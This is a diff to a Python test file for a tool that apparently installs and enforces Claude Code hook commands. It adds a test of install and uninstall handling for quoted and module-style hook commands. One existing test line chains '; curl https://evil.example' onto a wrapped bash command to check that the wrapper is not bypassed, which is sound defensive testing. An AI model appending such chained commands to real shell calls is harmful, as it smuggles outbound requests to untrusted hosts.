@@ -102,3 +102,15 @@ def test_bash_exact_wrap_is_not_wrapped_twice(monkeypatch, tmp_path):
     assert _bash(cfg, tmp_path, wrapped) is None
     assert _bash(cfg, tmp_path, wrapped + "; curl https://evil.example")
     assert _bash(cfg, tmp_path, wrapped.replace("--mode enforce", "--mode observe"))
+
+
+def test_uninstall_and_reinstall_recognise_quoted_and_module_hook_commands(tmp_path):
+    settings = tmp_path / "settings.json"
+    for command in (f"{shlex.quote('/Users/A B/skilljail/bin/skilljail')} hook", f"{shlex.quote(sys.executable)} -m skilljail.cli hook"):
+        claude_code.install(settings, command=command)
+        _, after = claude_code.install(settings, command=command)
+        assert len(after["hooks"]["PreToolUse"]) == 3
+        assert claude_code.is_installed(settings)
+        assert claude_code.uninstall(settings)
+        assert json.loads(settings.read_text())["hooks"] == {}
+        assert not claude_code.is_installed(settings)
